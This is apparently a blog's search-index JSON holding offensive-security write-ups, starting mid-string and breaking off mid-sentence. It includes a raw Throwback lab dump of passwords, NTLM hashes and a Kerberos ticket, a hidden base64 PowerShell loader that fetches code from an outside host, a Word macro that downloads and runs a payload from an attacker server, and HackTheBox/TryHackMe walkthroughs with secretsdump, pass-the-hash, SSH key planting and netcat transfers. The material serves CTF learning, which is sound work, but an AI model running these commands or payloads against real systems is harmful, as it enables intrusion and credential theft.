FEFJdfjep302dojsdfsFSFD                         || horsemanb     | XZCFLDOSPfem,wefweop3202D                       || peanutbutterm | fi9sfjidsJXSVNSKXKNXSIOPfpoiewspf               || humphreyw     | fedw99fjpfdsjpjpfodspjofpjf99                   || jeffersd      | fDSOKFSDFLMmxcvmxz;p[p[dgp[edfjf99              || petersj       | owowhatsthisowoDarknessBestGirlowo123uwu”);                                  foxxr      ILoveAnimemes :3              daviesj      efepjfjsdfjdsfpjopfdj4po              gongoh      etregrokdfskggdf’fd4po              dosierk      e2349efjsdsdfhgopfdj4po              murphyf      hacker1              jstewart      e423jjfjdsjfsdj32      +—————+————————————————-+imagedomain_users in database from timekeep machineMariaDB [timekeepusers]&gt; show tables; +————————-+ | Tables_in_timekeepusers |+————————-+| users                   |+————————-+1 row in set (0.001 sec)MariaDB [timekeepusers]&gt; use domain_users; Database changed +———————-+| ClemonsD             || DunlopM              || LoganF               || IbarraA              || YatesZ               || CopelandS            || MckeeE               || HeatonC              || FlowersK             || HardinA              || BurrowsA             || FinneganI            || GalindoI             || LyonsC               || FullerS              || SteeleJ              || WangG                || LoweryR              || JeffersD             || GreigH               || SharpK               || KruegerM             || ChenI                || VillanuevaD          || BegumK               || TBH{ac3f61048236fd39 || 8da9e2289622157e}    |+———————-+27 rows in set (0.002 sec)Other database contentSInce we have domain usernames and some passwords from the databasewe use the credentials to spray the domain controller using the jumbox by proxychainsSMB         10.200.154.117  445    THROWBACK-DC01   [+] THROWBACK.local\\JeffersD:Throwback2020Domain Controller CredentialsTHROWBACK.local\\JeffersD:Throwback2020proxychains xfreerdp /u:JeffersD /p:Throwback2020 /v:10.200.154.117FILE SHARE FROM WINDOWS TO LINUX USING AUTHENTICATED SMBSHARE ——————————————————————————————————————————————————————————————–some times group policies on AD will not permit connection to exeternal unsecure smbshare, so while creating an smbserver on linux using smbserver.py, user SMBv2 protocal and include user &amp; pass for authenticationpython3 /opt/impacket/examples/smbserver.py -smb2support -username hacker -password hacker fileshare .then connect to if from windows this way  net use \\10.50.151.25\\fileshare /user:hacker hackerafter connected succesfully, you can safely copy item from and to the saerverEXPLOITING USERS WITH DCSYNC PRIVILEGESFInding users with DCSYNC priv using bloodhound, search “Find Principals with DCSync Rights”with DCSYNC priviledges, we can dump credentials on the machine we have priviledges on, but with a valid credential of the user with tthe priviledgesTBH_Backup2348!proxychains impacket-secretsdump -dc-ip 10.200.154.117 throwback.local/backup@10.200.154.117THROWBACK.local\\MercerH:1206:aad3b435b51404eeaad3b435b51404ee:5edc955e8167199d1b7d0e656da0ceea:::‘“sekurlsa::pth /user:mercerh /domain:throwback.local /ntlm:5edc955e8167199d1b7d0e656da0ceea”’proxychains impacket-psexec -dc-ip 10.200.154.117 -hashes aad3b435b51404eeaad3b435b51404ee:5edc955e8167199d1b7d0e656da0ceea  throwback.local/mercerh@10.200.154.117=========================================================================================CROSS —– ATTACK=========================================================================================If we have Trust priviledges to another domain controller, we can authenticate to that DC , with the admin credential of our currently owned DCimpacket-psexec throwback.local/BlaireJ:7eQgx6YzxgG3vC45t5k9@10.200.154.219proxychains impacket-psexec -dc-ip 10.200.154.117 -hashes aad3b435b51404eeaad3b435b51404ee:5edc955e8167199d1b7d0e656da0ceea  throwback.local/mercerh@10.200.154.117proxychains xfreerdp /u:MercerH /p:-changepw /v:10.200.154.118 /size:80%lport =&gt; 4434powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB3ADEAZwBDAEkAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAdwAxAGcAQwBJAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAdwAxAGcAQwBJAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4ANQAwAC4AMQA1ADEALgAyADUAOgA4ADAAOAAwAC8AbAA4ADcAUgBhAGEAYgBUAE0AbwA5AFAALwBCAEIASwA0AHoAZABKAFkAMwAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4ANQAwAC4AMQA1ADEALgAyADUAOgA4ADAAOAAwAC8AbAA4ADcAUgBhAGEAYgBUAE0AbwA5AFAAJwApACkAOwA=ESM-Example@TBHSecurity.comFIN-Example@TBHSecurity.comHRE-Example@TBHSecurity.comITS-Example@TBHSecurity.comSEC-Example@TBHSecurity.comSEC-Jstewart@TBHSecurity.comusername : Jstewartdatabreach: pwnDBpassword: aqAwM53cW8AgRbfrTBSEC_GUEST:WelcomeTBSEC1!TBH{19b6ca4281bbef3ee060aaf1c2eb4021}user dc : TBH{3efabe3366172f3f97d1123f2cc6dfb5}$krb5tgs$23$TBService$TBSECURITY.LOCAL$TBSecurity.local/TBService$b6dde6b28ff3e7d640e1aba4deb7a8f4$0b5fbab74463df311800ea7ac953a7b0666c1cfadf1e0924d43c8321d07786bcaed59c52e6b513a84296c4a3b35a0f0556fab4bbfef7cadbaa739e0a921758c811a1aa7dbe81ca85b33a4eb9cc5ac52a73c04db150f19ead38606263c0799115761ac13e72006ad06583753328c13f2c7ed63725bc73d35f3f710af63e3a5971faceeb58e23b0cac57d9eef0f89dfbfa7e021d027223f4bacebfc99ff59519f38bdffc0f800da6e47f8b6f1a170b32c7420dcf5cf0b580ea653d8cab0ebec0f0fc84cf17bd4b0a48014500a02669d65fec2ebeb8598e7ddd9fe91bb9f03b016152007c5d70efbd40d44863eca49a8dcd6f177ea2f58236b6363269bbe099976ab0033fe32a3997cbc59606ade44e274952e8df7ec96253536dda361df7eafd7921c39473a00c8674b5fac13743a3a25abbda36d0574ae5524459c088a46da80f0aaea30e85962ff0720304808ed680eacea396666ead151a3007c16ff48ac7bba12499811d6a8eb8b565d81c8af85cdc1e6d85430f0979c2d04cb58fccb3a372316f60d79795aed56b296e2da8ad9070e2aa8143f6f4423aec59e1aae291ad3a344bfa953aee3e82f1377f822a31ea1c7df0e6e80e1776a0ae424882aca5168125f1bca66d48d935120fbba904fdb6e185302c50586514236a810880221830d4fed48d0622ded3668470e9ce94df7bea190f02b6496acb41971c2e16dc83c25215143190058b17689f3d05dafd74df3db6cdbb2449cbd9692e931f986cc6aaa9896b143c4a2dcfe03b50393500b5d63e1027a4523667a0a1fc3b209c6daac3979fb3054061db2f3bb0cff64a674326a02b748f1d6e9459ae4fd524b46f1ec2944227911f5d681d5a2df05e5fb634f7337cac4e78e06ea582f73aff990d45271bc1b1816aaf0d67d3300386fc9dc9fc3b9e3d6261228922ed10be93fb570a2116b886ccca5f585ad65e529e2bdc907a760d4e193397c11158a4a7f02e2b4e9ce841a1b254e5069afce57725af1072270d363b513f3791395b5d69e4348a3b8167eff21072f5667869abb75080eed567385c3447702b5cbca675baae0bd9c9bfa05066947ec368b20e9e51d3e2c4ea48a286d5d0a9eade6f1878c4c265c49be053b2ac50a96cf1b12b10cabfc2c8a2161d4835905fcbfd355a4c67a7eb8b2c4a9951708ccb383c2f574e41564f3f12c072375e0d0b3f62913e3717f6178f253c195d2429c94f60a3c6998a8c2ab6582413c007c5feb78bdca64ca9c11244db7a2fe69fbd0f39d9e4835578b4403a7e619e1881bdbc9ffb05e0b6534fec940583bfa87f4994f7bd7568d66487075ab8cca58ae822798c885e7a2473fcd3a0157affba7151f443e7b190aace7a262ae72b67992ea854cfbe3c876cabb1c6",
        "url": "/lab/throwback/"
      }
      ,
    
      "ctf-abcredteam": {
        "title": "ABC RedTeam CTF",
        "author": "",
        "category": "",
        "content": "ABC CyberHackathon RedTeam CTFCY3ER-R4TINTRODUCTIONMy team RedTeamNG recently came first in the The American Business Council Cybersecurity Hackathon 2021 organized by NaijaSecForce in patnership with major sponsors bothering from American Business Council,Microsoft,AWS, Cisco, Comercio, HP, IBM and othersThis write up would be focused only on the finals and specifically the RedTeam challenges running through the methodology used to tackling it,other post by my team mate Muzec would be covering the Web Challenges.SCENARIOThe scenario we are presented with by the organizers is that of an Fat Fingered individual that unconsciously opens every email and attachment he gets in he’s corporate email : obiora_nurudeen@ctf.ngArmed with just he’s name Nurudeen Obiora, the email above and the knowledge of the targets low awareness in basic email security,we thought of emulating a strategy we recently used at the DEFCON 29 RedTeam CTF by sending the target an email with the reverse shell payload attached.Now here is where the problem begins, as with almost every field: There is a race, race between Good and Bad, Positive and Negativeour intentions are of no good so every mechanism of security is against us which is a “replica” of a real life situation1st attempt: Sending an msfvenom payload + gmailUsing msfvenom we created a windows reverse shell payloadAttempting to send it to the target using swaksswaks : SWiss Army Knife Smtpwe are immediately flagged as malicious by Gmails Egress Malware Scanner2nd attempts: We resulted into trying several empire powershell payload and bypasses, Persian Hydra Xor encryption with Custom keys, EgeBalci/sgn Shikata_ga_nai encoder, All to no availFinal attempt: After numerous swift and failed attempt, we remembered Matthew Eidelberg talk at SourceZero Con : Remaining Invisible in the Age of EDR, a talk which showcase the ability to bypass defenses with a term called DLL unhooking using the ScareCrow BinaryIn short, we can generate some raw shellcode from the software of our choice (Cobalt Strike, Metasploit, PoshC2, etc) and pass it to the Scarecrow to get a loader back that will implement some common EDR evasion techniques.we decide to create a create a windows/x64/meterpreter\\reverse\\tcp shellcode using msfvenom [msfvenom shellcode is a pain, its crappy and might be unstable at times]then pass the raw shellcode to the scarecrow binary along with a random domain name for a cloned signed certificatewe then created a meterpreter listener using the connection variable of the shellcode as options: “would have preferred Cobalt-strike but its for the BigBoys like InfosecShinobi 🙂”DELIVERYThe output of ScareCrow is an obfuscated .exe payload, being at the third stage of the “cyber attack cycle” which is deliverywe somehow need to get the payload the victim machine and “run” itWe decided to use the old aged Microsoft Word Document with macro in the .docm extension,the function of the macro was to run a powershell one-liner that downloads the payload [Powerpnt.exe] binary hosted on our machine, store it in C:\\windows\\temp\\ and then run it  Sub Document_Open()MyMacroEnd Sub  Sub AutoOpen()MyMacroEnd Sub  Sub MyMacro()Dim str As Stringstr = “powershell iwr -uri http://x.x.x.x/Powerpnt.exe -o c:\\windows\\temp\\Powerpnt.exe; c:\\windows\\temp\\Powerpnt.exe”GetObject(“winmgmts:”).Get(“Win32_Process”).Create str, Null, Null, pidShell str, vbHideEnd Subit isnt advised to host any binary payload with the python http.server as there can be issues with the way it handles powershell Invoke Web Request or HTTPrequest  at times, starting a proper apache server is a better option Also know what port your binary is hosted on is important as there could be egress firewalls on the victim PC to non HTTP, HTTPS portWEAPONIZATIONWeaponized the final email and sent the .docm to the target by gmailTick! tock! Tick! tock!Itchy finger Nurudeen opens the malicious document with the payload sending us a meterpreter session on our VPS [wish it was cobalt strike, somebody buy us cobalt strike already!!]Now the hunt for flags begin, which literally means ENUMERATIONchecking to see what the internal IP looks like, we find the user IP address we we already solved the unintended way by checking the header of the response email\\[FLAG8\\]checking the current user directory and finding unattend.xml that contains \\[FLAG4\\]curious about what local users are on the machine just to get an idea of what movement of privilege escalation was necessary, lateral or horizontalwe find two more flags \\[FLAG3\\] \\[FLAG5\\]One of the challenges goes by the name “Registry Never Lies” which immediately prompted us to query the registry table to find [FLAG2]The what seems to be easy challenge turned to a battle “Outlook Storage 150points”, as most application data are stored in %APPDATA% we dived into it to get our hands on the loot after a quick research we figure the ost file is the microsoft outlook data bucket trying to transfer the file using the netcat binary, it failed cause the file was currently locked with the outlook process.We proceeded to killing the process and sending the OST to our local machine with netcatConverting the ost with the steller converter we find \\[FLAG1\\]After running out of flags to find, it was time for horizontal privilege escalationLATERAL PRIVILEGE ESCALATIONMachine Misconfigured with an Unquoted Service PathSometimes it is possible to escalate privileges by abusing mis-configured services. Specifically, this is possible if path to the service binary is not wrapped in quotes and there are spaces in the path..If you are using a long file name that contains a space, use quoted strings to indicate where the file name ends and the arguments begin; otherwise, the file name is ambiguous.For example, consider the string “c:\\program files\\safe software\\enjoy.exe”. This string can be interpreted in a number of ways.The system tries to interpret the possibilities in the following order:c:\\program.exec:\\program files\\safe.exec:\\program files\\safe software\\enjoy.exeif any of the directory along the path is writable and said service is running with system privileges then this misconfiguration is easily exploitablewe can enumerate and find Unquoted Service Path by using the wmic command wmic service get name,pathnamewe can aswell check to see if the service is running with system privileges still by using wmic wmic service get pathname,startname  END OF PART ONE  The difference between a noob and a hacker is that a hacker has failed more than a noob has ever tried",
        "url": "/ctf/abcredteam/"
      }
      ,
    
      "2021-05-07-thm-vulnetinternal-html": {
        "title": "Thm Vulnetinternal",
        "author": "",
        "category": "",
        "content": "",
        "url": "/2021/05/07/thm-vulnetinternal.html"
      }
      ,
    
      "thm-vulnetinternal": {
        "title": "TryHackMe - VulnNetInternal",
        "author": "",
        "category": "",
        "content": "VulnNet: Internal TryHackeMeHello Guys. We would be attacking the VulnNet:Internal, Yet another amazing box from TheCyb3rW0lf, This machine test and sharpen’s your services enumeration skillsWe start of my running a quick scan on all ports using threader300 and simultaneously running nmap service scan to cover the top portsWe immediately realize we need to enumerate several none http/https ports,SMB Enumeration : 138 | 445We we quickly list available share’s on the SMB server using the -L flag to list available shares and -N flag for a No Password login then immediately interacted with the “Vulnet Business Share” to get the Services FlagRPC Enumeration : 111 ,We start by listing the share’s available to be mounted from the server using showmount, then we mount the share on out local machine in the /tmp/mnt directoryEnumerating the share, we quickly dive down to the Redis directory to find notable information in the redis.conf fileMasterPassword in redis.confREDIS Enumeration : 6379REDIS the Remote Dictionary Server is an in-memory database we could enumerate Redis with either Netcat, MSF auxiliary scanner or Redis-cliusing Redis-cli which the best in my opinion we connect to the Redis server using the credentials we found in the mount earlier then query it for the list and content of database it holdswe found a notable rsync connection strings and The INTERNAL FLAG !,note it down and head back to the drawing board *Note Redis access could be used to gain Remote Code Execution using Crontab or placing SSH keys in any users $Home directory, none which worked in this instanceRSYNC Enumeration : 873rsync is a utility for efficiently transferring and synchronizing files between computers, drives and networksChecking for the available directory to be synchronized, we created a folder on our Local Working Directory then used rsyc to sync the remote folder to itNavigating through the files, we find our USER FLAG and the .SSH directoryGETTING A SHELLRSYNC has local and remote copy function’s, same way we were able to download the remote directory we could also put files in the remote directorywe immediately      generate an SSH keypair ,        place the public key in an authorized_keys files        copy to the the authorized_keys to the remote .ssh folder after giving it correct chmod 600 permissions  After which we are able to SSH into the machine as “sys-internal”GETTING ROOTEnumerating for ports only accessible on the local network we find port 8111 to be running a web application “TEAMCITY”We forward this port to our machine using SSH port forward with the private key we created earlierTrying all credentials we found so far all to know avail we head back to the machine to search for more credentials and/maybe authentication token to login as a super userGrepping for token, we find an authentication token that works in the password field without a username that in turn permits us to login into the “Teamcity” superuser dashboardGETTING ROOT ContdSince TeamCity is running as root, whatever connection we can get it to spawn will be with root permissions, we immediately started to poke for console pages/terminal or anything that be used to run system commandsAfter a while we figured you can create a project then build configuration, skipping the question for “New VCS Root”,Create a projectBuild ConfigurationAfter creating a build configuration choose “Build Steps” on the left menu to add a build step,Choose the runner type “Python”. Choose command as custom scriptthen place a python3 reverse shell in the custom script section without the ‘python -c’ then run build in the upper left , definitely after setting up a listener&lt;img src=”/assets/images/vulnetinternal/1*DyCYYloaZ2LtpG7R-tSamA.gif)Root, Chill And RememberThe difference between a noob and a hacker is that a hacker has failed more than a noob has ever tried :)",
        "url": "/thm/vulnetinternal/"
      }
      ,
    
      "thm-glitch": {
        "title": "TryHackMe - Glitch",
        "author": "",
        "category": "",
        "content": "GLITCH Room on  TryHackMe as a CLI JunkieGood day hacker, Spend more time in the CLI as much as you can, For that’s where we belongGlitch is a easy machine from TryHackMe that proves your ability to enumerate quickly and proves the solidification of your methodologyWe Start of with a quick comprehensive nmap scanWhile scan was running the -vv ‘very verbose’ tag on nmap gives us the port found as the scan probe’s are still runningWe immediately curl port 80 to figure out a simple javascript query to what’s an obvious apiWe proceed by sending a post request to the (‘/api/access’) page and enumerating what other method’s accepted by the api , in which we find the token :)method enumerationProceeding by fuzzing the api using “Fuzz Faster U Fool” FFUF we find an “items” endpointFuzz Faster U Foolthis item endpoint also accepts a post request which means we can send data to the endpoint only if we have a parameter , this leads us to API parameter fuzzing using ffuf which for some reason did’nt workDecided to try the old glorious wfuzz and Wholaaa!cmd found as valid parameterwe immediately send a post request to this endpoint using the cmd parameter only to get an error which included the “eval” method,Im nothing close to a JavaScript developer but in other language’s like php the eval() method is usually abused to achieve Remote Code ExecutionA quick google search of “JavaScript Eval RCE” leads us to LINK, which gives a break down of how eval could be exploited to gaining RCE using ‘chilprocess’Following this exploit we gain a shell on the machine to retrieve user.txt",
        "url": "/thm/glitch/"
      }
      ,
    
      "htb-traverxec": {
        "title": "HackTheBox - Traverxec",
        "author": "",
        "category": "",
        "content": "HackTheBox – TraverxecInitial EnumerationLet’s start by running a somewhat extensive nmap scan.$ nmap -sCSV -p 1-20000 10.10.10.165Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-30 21:19 AEDTNmap scan report for 10.10.10.165Host is up (0.054s latency).Not shown: 19998 filtered portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)| ssh-hostkey: |   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)80/tcp open  http    nostromo 1.9.6|_http-server-header: nostromo 1.9.6|_http-title: TRAVERXECService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelSo first thing we see is that port 80 is open. What is nostromo? Let’s do a quick check on searchsploit to see if we find anything.$ searchsploit nostromo---------------------------------------------------------------------------- ---------------------------------------- Exploit Title                                                              |  Path                                                                                                              | (/usr/share/exploitdb/)---------------------------------------------------------------------------- ----------------------------------------Nostromo - Directory Traversal Remote Command Execution (Metasploit)        | exploits/multiple/remote/47573.rb---------------------------------------------------------------------------- ----------------------------------------Very interesting. It appears that there is a RCE vulnerability in the nostromo framework. Let’s boot up msfconsole and see if we can get it to work.Initial FootholdWow, the metasploit exploit actually worked. This doesn’t normally happen? I guess that’s our initial foothold in the bag.www-data@traverxec:/var$ lslsbackups  cache  lib  local  lock  log  mail  nostromo  opt  run  spool  tmpwww-data@traverxec:/var$ Getting UserLet’s do some initial enumeration. For some reason the upload command in metasploit isn’t working, and wget doesn’t work either, so let’s try netcat.www-data@traverxec:/tmp$ nc 10.10.xx.xx 4444 &gt; LinEnum.sh$ nc -lv -p 4444 &lt; LinEnum.shCool, that worked. So let’s begin our initial enumeration on the server itself.www-data@traverxec:/tmp$ sh LinEnum.sh...-e [-] htpasswd found - could contain passwords:/var/nostromo/conf/.htpasswddavid:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/-e...A hash found in one of the nostromo .htpasswd files? Interesting, let’s crack it.$ echo 'david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/' &gt; david.hash$ john david.hash --wordlist=/usr/share/wordlists/rockyou.txtWarning: detected hash type \"md5crypt\", but the string is also recognized as \"md5crypt-long\"                         Use the \"--format=md5crypt-long\" option to force loading these as that type instead                                  Using default input encoding: UTF-8                                                                                  Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])                                Will run 12 OpenMP threads                                                                                           Press 'q' or Ctrl-C to abort, almost any other key for status                                                        Nowonly4me       (david)                                                                                             1g 0:00:00:24 DONE (2019-12-30 22:48) 0.04144g/s 438409p/s 438409c/s 438409C/s NuiMeanPoon..Norri83                  Use the \"--show\" option to display all of the cracked passwords reliably                                             Session completedNice, so now we have a password. We just need to find out what this password is for. A couple quick checks shows us that we can’t use it to SSH in as david, nor can we su - david. It’s probably safe to assume that it’s used as http basic authentication.Well, we didn’t get anything from trying that, so let’s dig around on the server some more. Maybe a good a idea to look into that nostromo folder.After literally 2 seconds of digging around the configuration files, I found a file called “nhttpd.conf”, so let’s take a look at the contents.# MAIN [MANDATORY]servername              traverxec.htbserverlisten            *serveradmin             david@traverxec.htbserverroot              /var/nostromoservermimes             conf/mimesdocroot                 /var/nostromo/htdocsdocindex                index.html# LOGS [OPTIONAL]logpid                  logs/nhttpd.pid# SETUID [RECOMMENDED]user                    www-data# BASIC AUTHENTICATION [OPTIONAL]htaccess                .htaccesshtpasswd                /var/nostromo/conf/.htpasswd# ALIASES [OPTIONAL]/icons                  /var/nostromo/icons# HOMEDIRS [OPTIONAL]homedirs                /homehomedirs_public         public_wwwI have no idea what to make of this, so a quick Google search for the man page for nostromo’s configuration file is probably in order.I found this. It appears that the home directory is exposed at http://traverxec.htb/~david/. Navigating to this page somewhat  confirms this, though it’s not really publicly accessible. Likely due to the homedirs_public option being set. Surely the permissions for this public_www folder must be accessible? I wonder what happens when we try to navigate to it within the shell.www-data@traverxec:/var/nostromo$ cd /home/david/public_wwwcd /home/david/public_wwwwww-data@traverxec:/home/david/public_www$ lslsindex.html  protected-file-areawww-data@traverxec:/home/david/public_www$ Huh, that actually worked? I wonder what’s in this protected-file-area folder? Let’s find out.www-data@traverxec:/home/david/public_www$ ls protected-file-areals protected-file-areabackup-ssh-identity-files.tgzAha! Backup SSH identity files. Let’s download these and try to use them. Metasploit’s download is being shitty again, so netcat it is.$ nc -lv -p 4444 &gt; backup-ssh-identity-files.tgzwww-data@traverxec:/home/david/public_www/protected-file-area$ nc 10.10.xx.xx 4444 &lt; \\ &gt; backup-ssh-identity-files.tgzLet’s SSH in.$ ssh -i ssh_david david@10.10.10.165Enter passphrase for key 'ssh_david':Yup, that’s a password. Time to crack it.$ /usr/share/john/ssh2john.py ssh_david &gt; ssh_david.hash$ john ssh_david --wordlist=/usr/share/wordlists/rockyou.txtUsing default input encoding: UTF-8Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashesCost 2 (iteration count) is 1 for all loaded hashesWill run 12 OpenMP threadsNote: This format may emit false positives, so it will keep trying even afterfinding a possible candidate.Press 'q' or Ctrl-C to abort, almost any other key for statushunter           (keys/ssh_david)1g 0:00:00:01 DONE (2019-12-30 23:46) 0.5347g/s 7669Kp/s 7669Kc/s 7669KC/s  0125457423 ..\\*7¡Vamos!Session completedNow let’s SSH in (again).$ ssh -i keys/ssh_david david@10.10.10.165Enter passphrase for key 'keys/ssh_david': david@traverxec:~$ Nice. We have the user.txt flag.david@traverxec:~$ cat user.txt7db0b48469606a42cec20750d9782f3dGetting RootDigging around david’s home directory we find an interesting file.david@traverxec:~/bin$ cat server-stats.sh#!/bin/bashcat /home/david/bin/server-stats.headecho \"Load: `/usr/bin/uptime`\"echo \" \"echo \"Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`\"echo \"Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`\"echo \" \"echo \"Last 5 journal log lines:\"/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/catThe last line here is particularly interesting. For those that don’t know, when journalctl is invoked, if the size of the terminal window isn’t large enough, journalctl will open a program called less which when run as sudo (like in this file).So what we can probably gather from this, is that david is able to run the command /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service, even though we can’t see the results of sudo -l, as we don’t know david’s password. A quick check confirms this theory.david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service-- Logs begin at Mon 2019-12-30 04:29:46 EST, end at Mon 2019-12-30 11:06:49 EST. --Dec 30 09:57:59 traverxec sudo[2393]: pam_unix(sudo:auth): conversation failedDec 30 09:57:59 traverxec sudo[2393]: pam_unix(sudo:auth): auth could not identify password for [www-data]Dec 30 09:57:59 traverxec sudo[2393]: www-data : command not allowed ; TTY=unknown ; PWD=/usr/bin ; USER=root ; COMMAND=listDec 30 09:58:41 traverxec sudo[2396]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/4 ruser=www-data rhost=  user=www-dataDec 30 09:58:54 traverxec sudo[2396]: www-data : command not allowed ; TTY=pts/4 ; PWD=/usr/bin ; USER=root ; COMMAND=listSo let’s make our terminal window smaller and invoke this command. Allowing us to access less as sudo and perform our privilege escalation.root@traverxec:/# iduid=0(root) gid=0(root) groups=0(root)root@traverxec:/# Nice. Time to get the flag.root@traverxec:/# cat /root/root.txt9aa36a6d76f785dfd320a478f6e0d906root@traverxec:/# Lessons Learned  Digging around application configuration files can be very important.  Reading the man pages for afformentioned config files is important too.  You can make inferences about sudo -l even if you don’t have the user’s password.  Sometimes weird behaviour of tools can be used to your advantage.",
        "url": "/htb/traverxec/"
      }
      ,
    
      "htb-artic": {
        "title": "HackTheBox - Arctic",
        "author": "",
        "category": "",
        "content": "Arctic was an easy one that i wont forget due to how certain exploits are used.ReconPort scanning shows port 5800 is open serving coldfusionSome directory bruteforcing returns CFIDE which will be our admin endpoint.Pwning the webappSearching exploit-db, we find a suitable exploit that may assist in getting into the coldfusion admin panel. Exploit 14641 does some amazing things, it will retrieve the password hash of the admin/user of the panel and inject it into the html of the login form!From this we get the password of ‘happyday’. From there, gaining a reverse shell through coldfusion is fairly stock standard. Setup a scheduled task with an upload and output file with a web directory then upload a shell. Run the task and navigate to the saved directory with a listener to gain a shell as arctic\\tolisGaining rootRunning ‘systeminfo’ on the box shows us theres no hotfixes installed and its not a brand new os. This particular box shows signs of being vulnerable to &lt;???&gt;. Download the Chimchurri exploit from github. Use a method of file transfer on windows like the following to recieve the file.&lt;run webserver to host file&gt;certutil -urlcache -split -f http://10.10.14.4/chimchurri.exe churr.exe&lt;execute exploit when new listener is running&gt;churr.exe 10.10.14.4 443Thats it ! quick and easy root for arctic. 14641 is still one of the simplest and most effective exploits ive seen.",
        "url": "/htb/artic/"
      }
      ,
    
      "htb-postman": {
        "title": "HackTheBox - Postman",
        "author": "",
        "category": "",
        "content": "HackTheBox – PostmanInitial EnumerationTo start, let’s run a basic nmap scan to see what’s running on the server’s TCP ports.nmap -sCSV 10.10.10.160Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-30 15:42 AEDTNmap scan report for 10.10.10.160Host is up (0.055s latency).Not shown: 997 closed portsPORT      STATE SERVICE VERSION22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: The Cyber Geek's Personal Website10000/tcp open  http    MiniServ 1.910 (Webmin httpd)|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWhat’s that? An open Webmin service? That could be interesting. We also have an http service running on port 80, we’ll probably check that out later too. But before any of that, let’s run a slightly more extensive port map.$ nmap -sCSV -p 1-20000 10.10.10.160Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-30 15:47 AEDTNmap scan report for 10.10.10.160Host is up (0.055s latency).Not shown: 19996 closed portsPORT      STATE SERVICE VERSION22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: The Cyber Geek's Personal Website6379/tcp  open  redis   Redis key-value store 4.0.910000/tcp open  http    MiniServ 1.910 (Webmin httpd)|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelNow that is interesting. An open Redis 